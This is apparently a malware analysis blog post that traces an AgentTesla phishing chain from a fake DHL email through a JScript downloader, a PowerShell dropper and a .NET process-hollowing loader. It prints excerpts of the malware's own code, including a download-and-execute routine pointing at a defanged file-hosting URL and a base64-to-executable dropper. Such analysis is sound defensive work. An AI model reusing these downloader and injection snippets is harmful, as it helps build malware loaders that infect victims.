---
title: "AgentTesla Analysis"
categories:
  - Malware Analysis
toc: true
---

This blog details the steps taken in unravelling the stages associated with a AgentTesla sample mentioned in my blog post on [Compromising Threat Actor Communications](https://polygonben.github.io/malware%20analysis/Compromising-Threat-Actor-Communications/). I thoroughly recommend checking this blog post out prior to reading this, for additional context. 

# Stage 1 (Email Attachment)

This particular campaign began with a malicious phishing email, impersonating DHL. 

The .eml file can be found on VirusTotal [here](https://www.virustotal.com/gui/file/3af579d5e612196cfa02d489f192b5c8c135556e39f0856b2e622dbe3f9002a1/detection).

* Sender: `Noreplydhl[@]windhym[.]site`
* DisplayName: `DHL Express Worldwide`
* Subject: `DHL - Shipment Document // Arrival Notice - AWB 13700658****`
* Attachment: `AWB DHL#84411.7z`

[![1](/assets/images/AgentTesla/1.png)](/assets/images/AgentTesla/1.png){: .full}

The malware itself is contained within the .7z attachment. We can see the attachment, `AWB DHL#84411.7z` (1fc37de1e469b72f89bd7624b4ffcbde), has many VT detections for "Trojan" & "Downloader".

We can use the `7z` command-line tool to extract this, revealing it contains a singular file `chase.jse`.

[![2](/assets/images/AgentTesla/2.png)](/assets/images/AgentTesla/2.png){: .full}

# Stage 2 (chase.jse)

We can see the 2nd stage, `chase.jse` (9a94ce2082740a534cf547af0a068102) is responsible for downloading another stage:

```js
// Constants to avoid magic strings
var URL = "hXXps://files[.]catbox[.]moe/8e6thc.ps1";
var DownloadPath = "C:\\Temp\\dddddd.ps1";
var TEMP_DIR = "C:\\Temp";
var SUCCESS_STATUS = 200;

//[...REDACTED...]
```

This 3rd stage, `8e6thc.ps1`, was downloaded via the `DownloadScript()` function, that uses a defined `http` object:

```js
//[...REDACTETD...]
var http = WScript.CreateObject("MSXML2.XMLHTTP");

//[...REDACTED...]

// Download the script securely
function DownloadScript(url, path) {
    http.Open("GET", url, false);
    http.Send();

    if (http.Status !== SUCCESS_STATUS) {
        LogError("Download failed with status: " + http.Status);
        return false;
    }

    try {
        var file = fileSystem.CreateTextFile(path, true);
        file.Write(http.ResponseText);
        file.Close();
        return true;
    } catch (e) {
        LogError("Error writing downloaded script: " + e.message);
        return false;
    }
}
//[...REDACTED...]
```

We can reference the [documentation](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms759148(v=vs.85)) to confirm this "MSXML2.XMLHTTP" object "provides client-side protocol support for communication with HTTP servers".

Once this 3rd-stage is written to disk, it is executed using the `RunPowerShellScript()` function:

```js
//[...REDACTED...]
var POWERSHELL_CMD = "PowerShell -NoProfile -ExecutionPolicy RemoteSigned -File ";

//[...REDACTED...]

// Execute PowerShell script
function RunPowerShellScript(scriptPath) {
    try {
        var powerShellCommand = POWERSHELL_CMD + "\"" + scriptPath + "\"";
        shell.Run(powerShellCommand, 0, true);
    } catch (e) {
        LogError("Failed to execute PowerShell script: " + e.message);
    }
}

//[...REDACTED...]
```

# Stage 3 (8e6thc.ps1)

I initially found this 3rd stage, `8e6thc.ps1` (466b9beeb51926c9d9ae9d538a2da037), via a RetroHunt query attempting to identify PowerShell scripts communicating with Telegram APIs. 

Looking at the contents of this file, we can see it contains a massive chunk of Base64 text. I have redacted the majority to save space, but this is the remaining file:

```js
$p=[IO.Path]::Combine($env:TEMP,"x.exe")
[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA[...REDACTED...]QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
Start-Process $p
```

We can see here, the file `x.exe` will be written to disk, within the the directory `C:\Users\<username>\AppData\Local\temp`. The content of this `x.exe` is retrieved by the `FromBase64String()` function. We can see the `Start-Process` cmdlet is the used to run this `x.exe` binary. 

We can either use [CyberChef](https://gchq.github.io/CyberChef/), or some command-line ninja magic to extract this PE:

[![3](/assets/images/AgentTesla/3.png)](/assets/images/AgentTesla/3.png){: .full}

Let's break this command down:

1. `cat 8e6thc.ps1` - spits out the content of the .ps1 file
2. `| grep -oE '[A-Za-z0-9+/]{50,}(==|=)?'` - from the above output, grep for a base64 string of text, 50+ characters long
3. `| base64 -d` - from the above output, decode this base64
4. `> stage4.bin` - write the contents of the base64 decoded content to a file `stage4.bin`

From our `file` command we can see the resulting file is a `PE32 executable`, or a Windows Executable (expected as it was written to `x.exe`), and also `.NET` based - meaning it is trivial for us to decompile this.

# Stage 4 (x.exe) 

## Preliminary analysis

### Detect It Easy

We can open this binary, `stage4.bin` (40927121AE9707853F62FB9D896CC167) or `x.exe`,  within DiE:

[![4](/assets/images/AgentTesla/4.png)](/assets/images/AgentTesla/4.png){: .full}

We can see this is a 32-bit .NET binary, written in C#, using .NET Framework v4.8 with CLR v4.0.30319. 

### Strings

Running strings reveals some interesting results like - `DecryptUsingTripleDES`, `AllocateMemoryForPayload`, `AllocateMemoryForPayload`, `CreateProcessA`, `InjectPayloadIntoProcess`, `VirtualAllocEx`, `WriteProcessMemory` & a massive chunk of base64 text. This may be indicative of process injection activity, but we will look into this shortly.

### capa

We can see running capa the below capabilities were discovered:

[![5](/assets/images/AgentTesla/5.png)](/assets/images/AgentTesla/5.png){: .full}

## .NET Source Code Analysis

We this is a .NET binary, we can easily recover the source code using any .NET decompiler you like. I have used DNSpy for this. 

### Program

Going through the executable, we can see all the malicious activity is occcuring within the namespace `Program`. Here the functions `AdjustThreadContextForExecution()`, `AllocateMemoryForPayload()`, `DecryptData()`, `DecryptDataUsingTripleDES()`, `ExecutePayload()`, `InitializeProcessStartupInfo()`, `InjectPayloadIntoProcess()`, `ResumeThreadContext()`, `StartExecutableProcess()`, `WriteHeadersAndSectionsToMemory()`& `Main()` are all defined. 

[![6](/assets/images/AgentTesla/6.png)](/assets/images/AgentTesla/6.png){: .full}

#### Main()

The Main method initializes three important elements:

* A large Base64-encoded string (named text) that represents the encrypted payload.
* A key and an initialization vector (IV) â€“ also provided as Base64 strings.
* It then calls `ExecutePayload()` with these parameters.

```c#
private static void Main(string[] args)
    {
      string text = "fK2NaQxHVYZVTAo+NeLyWNkL[...REDACTED...]";
      byte[] array = Convert.FromBase64String("iA9B1uKFddQdqiLSSuzvD2GhL1o2Jv+v");
      byte[] array2 = Convert.FromBase64String("b2CBFvcQeV4=");
      Program.ExecutePayload(text, array, array2);
    }
```

#### ExecutePayload()

We can see in the Main() function, the 5th stage is executed via calling the `ExecutePayload()` function:

```c#
    private static void ExecutePayload(string encryptedData, byte[] key, byte[] iv)
    {
      byte[] array = Program.DecryptData(encryptedData, key, iv);
      bool flag = array != null;
      if (flag)
      {
        string text = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
        Program.InjectPayloadIntoProcess(text, array);
      }
    }
```

Nice! We can see process injection is occuring here, which we'll get onto shortly, but prior to this - the payload is decrypted using the `DecryptData()` function.

#### Payload Decryption 

The functions `DecryptData()` & `DecryptUsingTripleDES()` are used to decrypt. 

##### DecryptData()

```c#
    private static byte[] DecryptData(string encryptedData, byte[] key, byte[] iv)
    {
      byte[] array = Convert.FromBase64String(encryptedData);
      return Program.DecryptUsingTripleDES(array, key, iv);
    }
```

* DecryptData first converts the provided encrypted string from Base64 back into a byte array.

##### DecryptUsingTripleDES()

```c#
    private static byte[] DecryptUsingTripleDES(byte[] cipherText, byte[] key, byte[] iv)
    {
      byte[] array;
      using (TripleDES tripleDES = TripleDES.Create())
      {
        tripleDES.KeySize = 128;
        tripleDES.BlockSize = 64;
        tripleDES.Padding = PaddingMode.PKCS7;
        tripleDES.Mode = CipherMode.CBC;
        tripleDES.Key = key;
        tripleDES.IV = iv;
        using (ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor(tripleDES.Key, tripleDES.IV))
        {
          using (MemoryStream memoryStream = new MemoryStream())
          {
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
            {
              cryptoStream.Write(cipherText, 0, cipherText.Length);
              cryptoStream.FlushFinalBlock();
              array = memoryStream.ToArray();
            }
          }
        }
      }
      return array;
    }
```

* It then calls DecryptUsingTripleDES, which uses the TripleDES algorithm in CBC mode with PKCS7 padding to decrypt the payload using the provided key and IV.

#### Process Injection

We can see that Process Hollowing of the `RegAsm.exe` process is being performed here, which can be broken down into the following steps:

* Choosing the Host Process: After decryption, the code builds the path to `RegAsm.exe` (a legitimate .NET assembly registration tool found in the runtime directory). This executable is used as a host for the injected payload.

* Injection Routine (InjectPayloadIntoProcess):

1) Process Creation: It first calls `InitializeProcessStartupInfo` and then uses `StartExecutableProcess` to create a new process in a suspended state. The use of `CreateProcessA` (wrapped inside the helper class BaseApp) indicates that the process is started with the intention of being manipulated before it begins execution.

2) Setting Up Thread Context: It retrieves the current thread context of the suspended process with `SetupThreadContext`, which is necessary to later change the execution point (instruction pointer) to the injected code.

3) Memory Allocation: The method `AllocateMemoryForPayload` uses `VirtualAllocEx` to reserve memory in the remote process. This memory will hold the payload.

4) Writing the Payload: With `WriteHeadersAndSectionsToMemory`, the code copies the payloadâ€™s headers and section data into the allocated memory space of the target process. This involves parsing the PE (Portable Executable) format to locate the relevant parts.

5) Adjusting Thread Context: The `AdjustThreadContextForExecution` method modifies the threadâ€™s context (especially the instruction pointer) so that when execution resumes, it starts running from the injected payload instead of the original code.

6) Resuming Execution: Finally, `ResumeThreadExecution` resumes the suspended process. Since the thread context was modified, the payload begins execution within the context of a legitimate process.
